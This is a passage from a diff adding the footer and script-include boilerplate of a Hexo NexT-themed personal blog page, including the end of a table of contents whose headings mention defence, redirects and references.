class="nav-number">5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思考"><span class="nav-number">6.</span> <span class="nav-text">思考</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#跳转"><span class="nav-number">6.1.</span> <span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探索"><span class="nav-number">6.2.</span> <span class="nav-text">探索</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0pa9ue</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">40.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
